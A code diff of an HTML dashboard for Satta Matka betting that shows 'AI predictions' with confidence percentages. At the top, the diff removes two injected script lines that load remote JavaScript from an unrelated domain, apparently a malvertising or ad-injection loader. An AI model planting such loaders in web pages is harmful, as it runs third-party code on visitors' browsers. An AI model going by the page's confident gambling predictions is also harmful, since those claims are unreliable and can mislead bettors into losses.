@@ -1,18 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-        <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gizokraijaw.net',9625707,document.createElement('script'))</script>
-        <script>(function(d,z,s){s.src='https://'+d+'/401/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('gizokraijaw.net',9625707,document.createElement('script'))</script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Satta Matka Pro - Advanced AI Analytics</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Advanced AI-powered Satta Matka predictions with real-time analytics">
-    <meta name="robots" content="noindex, nofollow"></meta>
+    <title>Satta Matka Live Dashboard</title>
     <style>
         * {
             margin: 0;
@@ -21,213 +12,204 @@
         }
 
         body {
-            font-family: 'Poppins', sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             color: #333;
         }
 
-        .realtime-status {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background: rgba(255, 255, 255, 0.9);
-            padding: 8px 15px;
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            z-index: 1000;
-            font-size: 14px;
+        .header {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 1rem;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
-        .status-indicator {
-            width: 10px;
-            height: 10px;
+        .header h1 {
+            color: #2c3e50;
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .live-indicator {
+            display: inline-flex;
+            align-items: center;
+            background: #27ae60;
+            color: white;
+            padding: 0.3rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            font-weight: bold;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background: #fff;
             border-radius: 50%;
-            background: #ff4757;
+            margin-right: 0.5rem;
             animation: pulse 2s infinite;
         }
 
-        .status-indicator.connected {
-            background: #2ed573;
-        }
-
         @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0.7; }
-            100% { transform: scale(1); opacity: 1; }
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
         }
 
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 20px;
+            padding: 2rem;
         }
 
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-            color: white;
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 2rem;
+            margin-bottom: 2rem;
         }
 
-        .header h1 {
-            font-size: 2.5rem;
-            font-weight: 700;
-            margin-bottom: 10px;
-        }
-
-        .header p {
-            font-size: 1.1rem;
-            opacity: 0.9;
-        }
-
-        .nav-tabs {
-            display: flex;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            padding: 5px;
-            margin-bottom: 30px;
-            backdrop-filter: blur(10px);
-            flex-wrap: wrap;
-            gap: 5px;
-        }
-
-        .nav-tab {
-            flex: 1;
-            padding: 12px 20px;
-            text-align: center;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            color: white;
-            font-weight: 500;
-            min-width: 120px;
-        }
-
-        .nav-tab:hover {
-            background: rgba(255, 255, 255, 0.2);
-        }
-
-        .nav-tab.active {
-            background: white;
-            color: #333;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        @media (max-width: 768px) {
+            .dashboard-grid {
+                grid-template-columns: 1fr;
+                gap: 1rem;
+            }
         }
 
         .section {
-            display: none;
-            background: white;
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            margin-bottom: 20px;
-        }
-
-        .section.active {
-            display: block;
-            animation: fadeIn 0.5s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .controls {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 30px;
-            flex-wrap: wrap;
-        }
-
-        .btn {
-            padding: 12px 25px;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            font-weight: 500;
-            transition: all 0.3s ease;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-
-        .btn-primary {
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            color: white;
-        }
-
-        .btn-secondary {
-            background: #f8f9fa;
-            color: #333;
-            border: 2px solid #e9ecef;
-        }
-
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
-        }
-
-        .prediction-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin-top: 20px;
-        }
-
-        .prediction-card {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            padding: 20px;
+            background: rgba(255, 255, 255, 0.95);
             border-radius: 15px;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+            padding: 1.5rem;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
         }
 
-        .prediction-card h3 {
-            margin-bottom: 15px;
-            font-size: 1.3rem;
-        }
-
-        .prediction-values {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-        }
-
-        .prediction-row {
+        .section-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 8px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+            margin-bottom: 1.5rem;
         }
 
-        .prediction-row:last-child {
-            border-bottom: none;
+        .section-title {
+            font-size: 1.4rem;
+            font-weight: bold;
+            color: #2c3e50;
         }
 
-        .confidence-badge {
-            background: rgba(255, 255, 255, 0.2);
-            padding: 4px 12px;
-            border-radius: 20px;
+        .refresh-btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            cursor: pointer;
             font-size: 0.9rem;
-            font-weight: 600;
+            transition: all 0.3s;
+        }
+
+        .refresh-btn:hover {
+            background: #2980b9;
+            transform: translateY(-2px);
+        }
+
+        .market-card {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            border-left: 4px solid #3498db;
+            transition: all 0.3s;
+        }
+
+        .market-card:hover {
+            transform: translateX(5px);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .market-name {
+            font-weight: bold;
+            font-size: 1.1rem;
+            color: #2c3e50;
+            margin-bottom: 0.8rem;
+        }
+
+        .prediction-row, .result-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 0.5rem 0;
+            padding: 0.3rem 0;
+        }
+
+        .label {
+            font-weight: 500;
+            color: #7f8c8d;
+            min-width: 60px;
+        }
+
+        .values {
+            font-weight: bold;
+            color: #2c3e50;
+            font-family: 'Courier New', monospace;
+        }
+
+        .confidence {
+            background: linear-gradient(45deg, #27ae60, #2ecc71);
+            color: white;
+            padding: 0.2rem 0.6rem;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .match-indicator {
+            display: inline-block;
+            padding: 0.2rem 0.5rem;
+            border-radius: 5px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            margin-left: 0.5rem;
+        }
+
+        .match-yes {
+            background: #27ae60;
+            color: white;
+        }
+
+        .match-no {
+            background: #e74c3c;
+            color: white;
+        }
+
+        .result-card {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 1rem;
+            margin-bottom: 1rem;
+            border-left: 4px solid #e74c3c;
+        }
+
+        .result-declared {
+            background: #d5f4e6;
+            border-left-color: #27ae60;
         }
 
         .loading {
             text-align: center;
-            padding: 40px;
+            padding: 2rem;
+            color: #7f8c8d;
         }
 
         .spinner {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
+            width: 30px;
+            height: 30px;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            margin: 0 auto 1rem;
         }
 
         @keyframes spin {
@@ -235,437 +217,146 @@
             100% { transform: rotate(360deg); }
         }
 
-        .error {
-            background: #ff4757;
-            color: white;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 10px 0;
+        .update-time {
+            font-size: 0.8rem;
+            color: #7f8c8d;
+            text-align: center;
+            margin-top: 1rem;
         }
 
-        .success {
-            background: #2ed573;
-            color: white;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 10px 0;
-        }
-
-        .analytics-grid {
+        .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-            margin-top: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 1rem;
+            margin-top: 2rem;
         }
 
-        .chart-container {
-            background: white;
-            padding: 20px;
-            border-radius: 15px;
+        .stat-card {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 10px;
+            padding: 1rem;
+            text-align: center;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
         }
 
-        .chart-container h3 {
-            margin-bottom: 15px;
-            color: #333;
-            font-size: 1.2rem;
-        }
-
-        .heatmap-grid {
-            display: grid;
-            grid-template-columns: repeat(5, 1fr);
-            gap: 10px;
-            margin-top: 10px;
-        }
-
-        .heatmap-cell {
-            width: 50px;
-            height: 50px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 8px;
-            color: white;
+        .stat-number {
+            font-size: 2rem;
             font-weight: bold;
-            cursor: pointer;
-            transition: transform 0.2s;
+            color: #3498db;
         }
 
-        .heatmap-cell:hover {
-            transform: scale(1.1);
-        }
-
-        .risk-cards {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 20px;
-        }
-
-        .risk-card {
-            flex: 1;
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            color: white;
-        }
-
-        .risk-card.high { background: #ff4757; }
-        .risk-card.medium { background: #ffa502; }
-        .risk-card.low { background: #2ed573; }
-
-        .confidence-meter {
-            margin-top: 20px;
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 20px;
-            background: #e9ecef;
-            border-radius: 10px;
-            overflow: hidden;
-        }
-
-        .progress {
-            height: 100%;
-            background: linear-gradient(45deg, #667eea, #764ba2);
-            transition: width 0.5s ease;
-        }
-
-        .calculator-form {
-            max-width: 500px;
-            margin: 0 auto;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: 500;
-            color: #333;
-        }
-
-        .form-group input,
-        .form-group select {
-            width: 100%;
-            padding: 12px;
-            border: 2px solid #e9ecef;
-            border-radius: 8px;
-            font-size: 16px;
-            transition: border-color 0.3s;
-        }
-
-        .form-group input:focus,
-        .form-group select:focus {
-            outline: none;
-            border-color: #667eea;
-        }
-
-        .pl-results {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 20px;
-        }
-
-        .result-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-            padding: 8px 0;
-            border-bottom: 1px solid #e9ecef;
-        }
-
-        .result-row.total {
-            font-weight: bold;
-            font-size: 1.1rem;
-            border-bottom: none;
-            margin-top: 10px;
-            padding-top: 15px;
-            border-top: 2px solid #667eea;
-        }
-
-        .win { color: #2ed573; font-weight: bold; }
-        .profit { color: #2ed573; font-weight: bold; }
-        .loss { color: #ff4757; font-weight: bold; }
-        .risk-high { color: #ff4757; }
-        .risk-medium { color: #ffa502; }
-        .risk-low { color: #2ed573; }
-
-        @media (max-width: 768px) {
-            .container {
-                padding: 10px;
-            }
-
-            .header h1 {
-                font-size: 2rem;
-            }
-
-            .nav-tabs {
-                flex-direction: column;
-            }
-
-            .nav-tab {
-                min-width: auto;
-            }
-
-            .controls {
-                flex-direction: column;
-            }
-
-            .btn {
-                justify-content: center;
-            }
-
-            .analytics-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .risk-cards {
-                flex-direction: column;
-            }
-
-            .heatmap-grid {
-                grid-template-columns: repeat(3, 1fr);
-            }
-
-            .heatmap-cell {
-                width: 40px;
-                height: 40px;
-            }
+        .stat-label {
+            color: #7f8c8d;
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
         }
     </style>
 </head>
 <body>
-    <!-- Real-time Status -->
-    <div class="realtime-status">
-        <div class="status-indicator" id="connectionStatus"></div>
-        <span id="statusText">Connecting...</span>
+    <div class="header">
+        <h1>🎯 Satta Matka Live Dashboard</h1>
+        <div class="live-indicator">
+            <div class="live-dot"></div>
+            LIVE
+        </div>
     </div>
 
     <div class="container">
-        <div class="header">
-            <h1><i class="fas fa-brain"></i> Satta Matka Pro</h1>
-            <p>Advanced AI-Powered Analytics & Real-Time Predictions</p>
-        </div>
-
-        <!-- Navigation Tabs -->
-        <div class="nav-tabs">
-            <div class="nav-tab active" onclick="showSection('predictions')">
-                <i class="fas fa-crystal-ball"></i> Predictions
-            </div>
-            <div class="nav-tab" onclick="showSection('analytics')">
-                <i class="fas fa-chart-line"></i> Analytics
-            </div>
-            <div class="nav-tab" onclick="showSection('calculator')">
-                <i class="fas fa-calculator"></i> P&L Calculator
-            </div>
-            <div class="nav-tab" onclick="showSection('preferences')">
-                <i class="fas fa-cog"></i> Preferences
-            </div>
-            <div class="nav-tab" onclick="showSection('results')">
-                <i class="fas fa-trophy"></i> Results
-            </div>
-        </div>
-
-        <!-- Predictions Section -->
-        <div class="section active" id="predictions">
-            <div class="controls">
-                <button class="btn btn-primary" onclick="generatePredictions()">
-                    <i class="fas fa-sync-alt"></i> Refresh Predictions
-                </button>
-                <button class="btn btn-secondary" onclick="exportData('predictions')">
-                    <i class="fas fa-download"></i> Export CSV
-                </button>
-            </div>
-            <div id="predictionsContent">
-                <div class="loading">
-                    <div class="spinner"></div>
-                    <p>Click "Generate Predictions" to start AI analysis...</p>
+        <div class="dashboard-grid">
+            <!-- Predictions Section -->
+            <div class="section">
+                <div class="section-header">
+                    <div class="section-title">🤖 AI Predictions</div>
+                    <button class="refresh-btn" onclick="refreshPredictions()">Refresh</button>
+                </div>
+                <div id="predictionsContent">
+                    <div class="loading">
+                        <div class="spinner"></div>
+                        <p>Loading predictions...</p>
+                    </div>
                 </div>
             </div>
-        </div>
 
-        <!-- Analytics Section -->
-        <div class="section" id="analytics">
-            <div class="controls">
-                <button class="btn btn-primary" onclick="loadAnalytics()">
-                    <i class="fas fa-chart-bar"></i> Load Analytics
-                </button>
-                <button class="btn btn-secondary" onclick="loadHeatmap()">
-                    <i class="fas fa-fire"></i> Number Heatmap
-                </button>
-                <button class="btn btn-secondary" onclick="loadAccuracyChart()">
-                    <i class="fas fa-target"></i> Accuracy Trends
-                </button>
-            </div>
-            <div id="analyticsContent">
-                <div class="analytics-grid">
-                    <div class="chart-container">
-                        <h3>Market Performance</h3>
-                        <canvas id="performanceChart" width="400" height="200"></canvas>
-                    </div>
-                    <div class="chart-container">
-                        <h3>Number Frequency Heatmap</h3>
-                        <div id="heatmapContainer"></div>
-                    </div>
-                    <div class="chart-container">
-                        <h3>Prediction Accuracy Over Time</h3>
-                        <canvas id="accuracyChart" width="400" height="200"></canvas>
-                    </div>
-                    <div class="chart-container">
-                        <h3>Risk Assessment</h3>
-                        <div id="riskMetrics"></div>
+            <!-- Results Section -->
+            <div class="section">
+                <div class="section-header">
+                    <div class="section-title">📊 Live Results</div>
+                    <button class="refresh-btn" onclick="refreshResults()">Refresh</button>
+                </div>
+                <div id="resultsContent">
+                    <div class="loading">
+                        <div class="spinner"></div>
+                        <p>Loading results...</p>
                     </div>
                 </div>
             </div>
         </div>
 
-        <!-- P&L Calculator Section -->
-        <div class="section" id="calculator">
-            <h2>Profit & Loss Calculator</h2>
-            <div id="calculatorContent">
-                <div class="calculator-form">
-                    <div class="form-group">
-                        <label>Market:</label>
-                        <select id="calcMarket">
-                            <option value="Time Bazar">Time Bazar</option>
-                            <option value="Milan Day">Milan Day</option>
-                            <option value="Rajdhani Day">Rajdhani Day</option>
-                            <option value="Kalyan">Kalyan</option>
-                            <option value="Milan Night">Milan Night</option>
-                            <option value="Rajdhani Night">Rajdhani Night</option>
-                            <option value="Main Bazar">Main Bazar</option>
-                        </select>
-                    </div>
-                    <div class="form-group">
-                        <label>Bet Type:</label>
-                        <select id="betType">
-                            <option value="single">Single</option>
-                            <option value="jodi">Jodi</option>
-                            <option value="patti">Patti</option>
-                            <option value="half_panel">Half Panel</option>
-                            <option value="full_panel">Full Panel</option>
-                        </select>
-                    </div>
-                    <div class="form-group">
-                        <label>Bet Amount (₹):</label>
-                        <input type="number" id="betAmount" placeholder="Enter amount" min="1">
-                    </div>
-                    <div class="form-group">
-                        <label>Number Bet:</label>
-                        <input type="text" id="numberBet" placeholder="Enter numbers">
-                    </div>
-                    <div class="form-group">
-                        <button class="btn btn-primary" onclick="calculatePL()">
-                            <i class="fas fa-calculator"></i> Calculate P&L
-                        </button>
-                    </div>
-                    <div id="calculatorResults"></div>
-                </div>
+        <!-- Statistics Section -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number" id="accuracyStat">--</div>
+                <div class="stat-label">Overall Accuracy</div>
             </div>
-        </div>
-
-        <!-- Preferences Section -->
-        <div class="section" id="preferences">
-            <div class="settings-content">
-                <h3>⚙️ Application Settings</h3>
-                <div class="setting-group">
-                    <label>Favorite Markets:</label>
-                    <div class="checkbox-group" id="favoriteMarkets">
-                        <label><input type="checkbox" value="Time Bazar"> Time Bazar</label>
-                        <label><input type="checkbox" value="Milan Day"> Milan Day</label>
-                        <label><input type="checkbox" value="Rajdhani Day"> Rajdhani Day</label>
-                        <label><input type="checkbox" value="Kalyan"> Kalyan</label>
-                        <label><input type="checkbox" value="Milan Night"> Milan Night</label>
-                        <label><input type="checkbox" value="Rajdhani Night"> Rajdhani Night</label>
-                        <label><input type="checkbox" value="Main Bazar"> Main Bazar</label>
-                    </div>
-                </div>
-                <div class="setting-group">
-                    <label>Notification Preferences:</label>
-                    <div class="checkbox-group" id="notificationSettings">
-                        <label><input type="checkbox" value="predictions"> New Predictions</label>
-                        <label><input type="checkbox" value="results"> Results Declared</label>
-                        <label><input type="checkbox" value="high_confidence"> High Confidence Alerts</label>
-                    </div>
-                </div>
-                <div class="setting-group">
-                    <label>Auto-refresh Interval:</label>
-                    <select id="refreshInterval">
-                        <option value="30">30 seconds</option>
-                        <option value="60" selected>1 minute</option>
-                        <option value="300">5 minutes</option>
-                        <option value="600">10 minutes</option>
-                    </select>
-                </div>
-                <button class="btn btn-primary" onclick="saveSettings()">Save Settings</button>
-                <button class="btn btn-secondary" onclick="loadSettings()">Load Settings</button>
+            <div class="stat-card">
+                <div class="stat-number" id="matchesStat">--</div>
+                <div class="stat-label">Today's Matches</div>
             </div>
-        </div>
-
-        <!-- Results Section -->
-        <div class="section" id="results">
-            <div class="controls">
-                <button class="btn btn-primary" onclick="loadResults()">
-                    <i class="fas fa-trophy"></i> Load Latest Results
-                </button>
-                <button class="btn btn-secondary" onclick="exportData('results')">
-                    <i class="fas fa-download"></i> Export Results
-                </button>
+            <div class="stat-card">
+                <div class="stat-number" id="marketsStat">7</div>
+                <div class="stat-label">Active Markets</div>
             </div>
-            <div id="resultsContent">
-                <div class="loading">
-                    <div class="spinner"></div>
-                    <p>Loading latest results...</p>
-                </div>
+            <div class="stat-card">
+                <div class="stat-number" id="confidenceStat">--</div>
+                <div class="stat-label">Avg Confidence</div>
             </div>
         </div>
     </div>
 
     <script>
-        // Socket.IO connection
-        const socket = io();
+        let predictionsData = null;
+        let resultsData = null;
 
-        socket.on('connect', function() {
-            document.getElementById('connectionStatus').classList.add('connected');
-            document.getElementById('statusText').textContent = 'Connected';
+        // Load data immediately on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            loadDashboardData();
         });
 
-        socket.on('disconnect', function() {
-            document.getElementById('connectionStatus').classList.remove('connected');
-            document.getElementById('statusText').textContent = 'Disconnected';
-        });
+        // Auto-refresh every 30 seconds
+        setInterval(loadDashboardData, 30000);
 
-        socket.on('update', function(data) {
-            console.log('Real-time update:', data);
-        });
-
-        // Navigation
-        function showSection(sectionName) {
-            // Hide all sections
-            document.querySelectorAll('.section').forEach(section => {
-                section.classList.remove('active');
-            });
-
-            // Remove active class from all tabs
-            document.querySelectorAll('.nav-tab').forEach(tab => {
-                tab.classList.remove('active');
-            });
-
-            // Show selected section
-            document.getElementById(sectionName).classList.add('active');
-
-            // Add active class to clicked tab
-            event.target.classList.add('active');
+        async function loadDashboardData() {
+            await Promise.all([
+                loadPredictions(),
+                loadResults()
+            ]);
+            updateStatistics();
         }
 
-        // Generate Fresh Predictions (force refresh)
-        async function generatePredictions() {
-            const content = document.getElementById('predictionsContent');
-            content.innerHTML = `
+        async function loadPredictions() {
+            try {
+                const response = await fetch('/api/predictions-cached');
+                const data = await response.json();
+
+                if (data.success && data.predictions.length > 0) {
+                    predictionsData = data;
+                    displayPredictions(data.predictions, data.date);
+                } else {
+                    // Generate new predictions if no cache
+                    await generateNewPredictions();
+                }
+            } catch (error) {
+                console.error('Error loading predictions:', error);
+                document.getElementById('predictionsContent').innerHTML = `
+                    <div class="loading">
+                        <p>Error loading predictions. <button onclick="generateNewPredictions()">Retry</button></p>
+                    </div>
+                `;
+            }
+        }
+
+        async function generateNewPredictions() {
+            document.getElementById('predictionsContent').innerHTML = `
                 <div class="loading">
                     <div class="spinner"></div>
                     <p>Generating fresh AI predictions...</p>
@@ -677,756 +368,179 @@
                 const data = await response.json();
 
                 if (data.success) {
+                    predictionsData = data;
                     displayPredictions(data.predictions, data.date);
-                    // Show success message
-                    const successMsg = document.createElement('div');
-                    successMsg.className = 'success';
-                    successMsg.innerHTML = '<i class="fas fa-check"></i> Fresh predictions generated!';
-                    content.insertBefore(successMsg, content.firstChild);
-                    setTimeout(() => successMsg.remove(), 3000);
                 } else {
-                    content.innerHTML = `<div class="error">Error: ${data.error}</div>`;
+                    throw new Error(data.error || 'Failed to generate predictions');
                 }
             } catch (error) {
-                content.innerHTML = `<div class="error">Network error: ${error.message}</div>`;
+                console.error('Error generating predictions:', error);
+                document.getElementById('predictionsContent').innerHTML = `
+                    <div class="loading">
+                        <p>Failed to generate predictions: ${error.message}</p>
+                    </div>
+                `;
             }
         }
 
         function displayPredictions(predictions, date) {
             const content = document.getElementById('predictionsContent');
 
-            let html = `<h2>AI Predictions for ${date}</h2><div class="prediction-grid">`;
-
+            let html = '';
             predictions.forEach(pred => {
                 if (pred.status === 'success') {
                     html += `
-                        <div class="prediction-card">
-                            <h3>${pred.market}</h3>
-                            <div class="confidence-badge">Confidence: ${pred.confidence}%</div>
-                            <div class="prediction-values">
-                                <div class="prediction-row">
-                                    <span>Open:</span>
-                                    <span>${pred.open ? pred.open.join(', ') : 'N/A'}</span>
-                                </div>
-                                <div class="prediction-row">
-                                    <span>Close:</span>
-                                    <span>${pred.close ? pred.close.join(', ') : 'N/A'}</span>
-                                </div>
-                                <div class="prediction-row">
-                                    <span>Pattis:</span>
-                                    <span>${pred.pattis ? pred.pattis.join(', ') : 'N/A'}</span>
-                                </div>
-                                <div class="prediction-row">
-                                    <span>Jodis:</span>
-                                    <span>${pred.jodis ? pred.jodis.slice(0, 5).join(', ') : 'N/A'}</span>
-                                </div>
+                        <div class="market-card">
+                            <div class="market-name">${pred.market}</div>
+                            <div class="prediction-row">
+                                <span class="label">Open:</span>
+                                <span class="values">${pred.open.join(', ')}</span>
                             </div>
-                        </div>
-                    `;
-                } else {
-                    html += `
-                        <div class="prediction-card">
-                            <h3>${pred.market}</h3>
-                            <div class="error">Error: ${pred.message}</div>
+                            <div class="prediction-row">
+                                <span class="label">Close:</span>
+                                <span class="values">${pred.close.join(', ')}</span>
+                            </div>
+                            <div class="prediction-row">
+                                <span class="label">Jodis:</span>
+                                <span class="values">${pred.jodis.slice(0, 5).join(', ')}</span>
+                            </div>
+                            <div class="prediction-row">
+                                <span class="label">AI:</span>
+                                <span class="confidence">${pred.confidence}% Confidence</span>
+                            </div>
                         </div>
                     `;
                 }
             });
 
-            html += '</div>';
+            html += `<div class="update-time">Last updated: ${new Date().toLocaleTimeString()}</div>`;
             content.innerHTML = html;
         }
 
-        // Load Analytics
-
-async function loadAnalytics() {
-            const content = document.getElementById('analyticsContent');
-            content.innerHTML = `
-                <div class="loading">
-                    <div class="spinner"></div>
-                    <p>Loading analytics data...</p>
-                </div>
-            `;
-
+        async function loadResults() {
             try {
-                const [performanceRes, heatmapRes, accuracyRes, riskRes] = await Promise.all([
-                    fetch('/api/analytics/performance').catch(e => {
-                        console.error('Performance fetch error:', e);
-                        return { ok: false, status: 500, json: () => Promise.resolve({ success: false, error: e.message }) };
-                    }),
-                    fetch('/api/analytics/heatmap').catch(e => {
-                        console.error('Heatmap fetch error:', e);
-                        return { ok: false, status: 500, json: () => Promise.resolve({ success: false, error: e.message }) };
-                    }),
-                    fetch('/api/analytics/accuracy-trend').catch(e => {
-                        console.error('Accuracy fetch error:', e);
-                        return { ok: false, status: 500, json: () => Promise.resolve({ success: false, error: e.message }) };
-                    }),
-                    fetch('/api/analytics/risk-metrics').catch(e => {
-                        console.error('Risk fetch error:', e);
-                        return { ok: false, status: 500, json: () => Promise.resolve({ success: false, error: e.message }) };
-                    })
-                ]);
-
-                const performance = await safeJsonParse(performanceRes);
-                const heatmap = await safeJsonParse(heatmapRes);
-                const accuracy = await safeJsonParse(accuracyRes);
-                const risk = await safeJsonParse(riskRes);
-
-                displayAnalytics(performance, heatmap, accuracy, risk);
-            } catch (error) {
-                console.error('Analytics error:', error);
-                content.innerHTML = `<div class="error">Error loading analytics: ${error.message}</div>`;
-            }
-        }
-
-        async function safeJsonParse(response) {
-            try {
-                if (!response.ok) {
-                    return { success: false, error: `HTTP ${response.status}` };
-                }
-                const text = await response.text();
-                if (!text || text.trim() === '') {
-                    return { success: false, error: 'Empty response' };
-                }
-                return JSON.parse(text);
-            } catch (e) {
-                console.error('JSON parse error:', e);
-                return { success: false, error: 'Invalid JSON response' };
-            }
-        }
-
-
-        // Export Data
-        async function exportData(type) {
-            try {
-                const response = await fetch(`/api/export/csv/${type}`);
-                if (response.ok) {
-                    const blob = await response.blob();
-                    const url = window.URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = `${type}_${new Date().toISOString().split('T')[0]}.csv`;
-                    document.body.appendChild(a);
-                    a.click();
-                    window.URL.revokeObjectURL(url);
-                    document.body.removeChild(a);
-                } else {
-                    alert('Export failed');
-                }
-            } catch (error) {
-                alert('Export error: ' + error.message);
-            }
-        }
-
-        // Advanced Analytics Functions
-
-async function loadAnalytics() {
-            const content = document.getElementById('analyticsContent');
-            content.innerHTML = `
-                <div class="loading">
-                    <div class="spinner"></div>
-                    <p>Loading analytics data...</p>
-                </div>
-            `;
-
-            try {
-                const [performanceRes, heatmapRes, accuracyRes, riskRes] = await Promise.all([
-                    fetch('/api/analytics/performance').catch(e => {
-                        console.error('Performance fetch error:', e);
-                        return { ok: false, status: 500, json: () => Promise.resolve({ success: false, error: e.message }) };
-                    }),
-                    fetch('/api/analytics/heatmap').catch(e => {
-                        console.error('Heatmap fetch error:', e);
-                        return { ok: false, status: 500, json: () => Promise.resolve({ success: false, error: e.message }) };
-                    }),
-                    fetch('/api/analytics/accuracy-trend').catch(e => {
-                        console.error('Accuracy fetch error:', e);
-                        return { ok: false, status: 500, json: () => Promise.resolve({ success: false, error: e.message }) };
-                    }),
-                    fetch('/api/analytics/risk-metrics').catch(e => {
-                        console.error('Risk fetch error:', e);
-                        return { ok: false, status: 500, json: () => Promise.resolve({ success: false, error: e.message }) };
-                    })
-                ]);
-
-                const performance = await safeJsonParse(performanceRes);
-                const heatmap = await safeJsonParse(heatmapRes);
-                const accuracy = await safeJsonParse(accuracyRes);
-                const risk = await safeJsonParse(riskRes);
-
-                displayAnalytics(performance, heatmap, accuracy, risk);
-            } catch (error) {
-                console.error('Analytics error:', error);
-                content.innerHTML = `<div class="error">Error loading analytics: ${error.message}</div>`;
-            }
-        }
-
-        async function safeJsonParse(response) {
-            try {
-                if (!response.ok) {
-                    return { success: false, error: `HTTP ${response.status}` };
-                }
-                const text = await response.text();
-                if (!text || text.trim() === '') {
-                    return { success: false, error: 'Empty response' };
-                }
-                return JSON.parse(text);
-            } catch (e) {
-                console.error('JSON parse error:', e);
-                return { success: false, error: 'Invalid JSON response' };
-            }
-        }
-        function updatePerformanceCharts(data) {
-                try {
-                    if (!data || !data.success || !data.markets || !Array.isArray(data.markets)) return;
-
-                    const ctx = document.getElementById('performanceChart');
-                    if (!ctx) return;
-
-                    // Clear existing chart if any
-                    if (window.performanceChart) {
-                        window.performanceChart.destroy();
-                    }
-
-                    window.performanceChart = new Chart(ctx.getContext('2d'), {
-                        type: 'bar',
-                        data: {
-                            labels: data.markets.map(m => m.name || 'Unknown'),
-                            datasets: [{
-                                label: 'Accuracy %',
-                                data: data.markets.map(m => m.accuracy || 0),
